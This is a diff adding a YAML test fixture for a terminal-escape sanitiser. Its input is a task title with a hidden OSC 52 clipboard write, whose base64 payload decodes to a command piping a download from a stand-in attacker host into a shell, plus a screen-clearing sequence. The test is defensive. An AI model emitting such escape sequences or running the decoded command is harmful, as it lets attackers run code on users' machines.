@@ -1,0 +1,10 @@
+id: C-010
+vector: terminal
+input:
+  surface: llm-output
+  # A task title with an OSC 52 clipboard write and a CSI clear-screen.
+  text: "Add login\x1b]52;c;Y3VybCBldmlsLmV4YW1wbGUgfCBzaA==\x07 page\x1b[2J"
+expected:
+  outcome: >-
+    strip_terminal_escapes removes the OSC and CSI sequences before any terminal output, and
+    JSON output escapes them (invariant I-6).
